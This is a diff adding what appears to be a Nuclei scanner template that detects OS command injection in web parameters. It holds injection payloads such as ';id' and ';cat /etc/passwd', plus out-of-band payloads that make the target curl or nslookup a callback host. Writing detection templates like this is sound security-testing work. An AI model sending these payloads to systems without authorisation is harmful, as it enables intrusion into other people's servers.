@@ -1,0 +1,46 @@
+id: cwe-78-command-injection
+info:
+  name: OS Command Injection Detection
+  author: security-all-in-one
+  severity: critical
+  description: Tests for OS command injection in parameters
+  classification:
+    cwe-id: CWE-78
+    cvss-score: 9.8
+  tags: rce,command-injection,cwe-78,dast,bug-bounty
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?cmd={{url_encode(';id')}}"
+      - "{{BaseURL}}/?exec={{url_encode('|id')}}"
+      - "{{BaseURL}}/?command={{url_encode('`id`')}}"
+      - "{{BaseURL}}/?ping={{url_encode(';cat /etc/passwd')}}"
+      - "{{BaseURL}}/?host={{url_encode('127.0.0.1;id')}}"
+      - "{{BaseURL}}/?ip={{url_encode('$(id)')}}"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+\(.*\) gid=[0-9]+\(.*\)"
+
+      - type: status
+        status:
+          - 200
+
+  # OOB detection
+  - method: GET
+    path:
+      - "{{BaseURL}}/?host={{url_encode(';curl {{interactsh-url}}')}}"
+      - "{{BaseURL}}/?ip={{url_encode('$(curl {{interactsh-url}})')}}"
+      - "{{BaseURL}}/?ping={{url_encode('`nslookup {{interactsh-url}}`')}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
